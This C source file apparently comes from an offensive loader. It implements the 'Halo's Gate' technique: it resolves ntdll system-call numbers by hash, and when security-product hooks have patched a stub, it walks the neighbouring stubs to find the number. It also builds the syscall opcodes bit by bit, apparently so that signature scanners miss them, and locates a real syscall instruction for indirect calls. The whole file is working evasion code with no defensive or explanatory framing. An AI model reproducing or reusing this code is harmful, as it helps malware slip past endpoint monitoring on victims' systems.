#include "HalosGate.h"


__forceinline USHORT GetSyscallOpcode(void)
{
    volatile USHORT v = 0x05;
    v = (v << 8) | 0x0F;
    return v;
}

__forceinline DWORD GetSyscallStubOpcode(void)
{
    volatile DWORD v = 0xB8;
    v = (v << 8) | 0xD1;
    v = (v << 8) | 0x8B;
    v = (v << 8) | 0x4C;
    return v;
}


BOOL ResolveSyscallByHash(IN DWORD dwSyscallNameHash, OUT PSYSCALL_ENTRY pEntry)
{
    static HMODULE  hNtdll          = NULL;
    PBYTE           pStubAddr       = NULL;
    PBYTE           pNeighbor       = NULL;
    USHORT          usSyscallOp     = GetSyscallOpcode();
    DWORD           dwStubSig       = GetSyscallStubOpcode();
    BOOL            bFound          = FALSE;

    if (!dwSyscallNameHash || !pEntry) return FALSE;

    if (!hNtdll)
    {
        if (!(hNtdll = ResolveModuleByHash(CRC32B_NTDLLDLL)))
        {
            TRACE("[!] ResolveModuleByHash failed for ntdll");
            return FALSE;
        }
    }

    if (!(pStubAddr = (PBYTE)ResolveProcByHash(hNtdll, dwSyscallNameHash)))
    {
        TRACE("[!] ResolveProcByHash failed: 0x%016I64X", dwSyscallNameHash);
        return FALSE;
    }

    pEntry->pSyscallAddress = (PVOID)pStubAddr;

    // Clean stub check: 4C 8B D1 B8 XX XX 00 00
    if (*(DWORD*)pStubAddr == dwStubSig && *(WORD*)(pStubAddr + 0x06) == 0x0000)
    {
        pEntry->dwSSn = *(DWORD*)(pStubAddr + 0x04);
        bFound = TRUE;
    }
    else
    {
        // Halo's Gate: walk neighbor stubs to find a clean one
        for (int wIdx = 1; wIdx <= MAXBYTE; wIdx++)
        {
            for (int nDir = -1; nDir <= 1; nDir += 2)
            {
                pNeighbor = pStubAddr + (wIdx * nDir * 32);

                if (*(DWORD*)pNeighbor == dwStubSig && *(WORD*)(pNeighbor + 0x06) == 0x0000)
                {
                    pEntry->dwSSn = *(DWORD*)(pNeighbor + 0x04) - (wIdx * nDir);
                    bFound = TRUE;
                    break;
                }
            }

            if (bFound) break;
        }
    }

    if (!bFound) return FALSE;

    // Scan forward for a legitimate 'syscall' instruction
    for (int i = 0; i < MAXBYTE; i++)
    {
        if (*(WORD*)(pStubAddr + i) == usSyscallOp)
        {
            pEntry->pSyscallInstAddress = (PVOID)(pStubAddr + i);
            return TRUE;
        }
    }

    return FALSE;
}
